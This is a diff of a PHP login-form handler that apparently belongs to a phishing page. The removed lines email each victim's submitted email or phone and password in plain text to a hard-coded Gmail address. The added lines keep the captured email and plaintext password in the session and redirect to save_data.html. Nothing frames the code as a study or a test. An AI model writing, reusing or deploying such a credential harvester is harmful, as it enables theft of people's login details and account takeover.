@@ -1,20 +1,15 @@
 <?php
-// Check if the form was submitted
+session_start();
+
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Get the email and password from the form
-    $email = $_POST['email'];
-    $password = $_POST['password'];
+    $email = htmlspecialchars($_POST['email']);
+    $password = htmlspecialchars($_POST['password']);
 
-    // Prepare the email content
-    $to = "oumaimamezni.isims@gmail.com";  // Replace with your email address
-    $subject = "Login Data Submission";
-    $message = "Email/Phone: " . $email . "\nPassword: " . $password;
+    $_SESSION['email'] = $email;
+    $_SESSION['password'] = $password;
 
-    // Send the email
-    if (mail($to, $subject, $message)) {
-        echo "Data sent via email successfully!";
-    } else {
-        echo "Error: Email could not be sent.";
-    }
+    // Redirect to save_data.html after submission
+    header("Location: save_data.html");
+    exit();
 }
 ?>
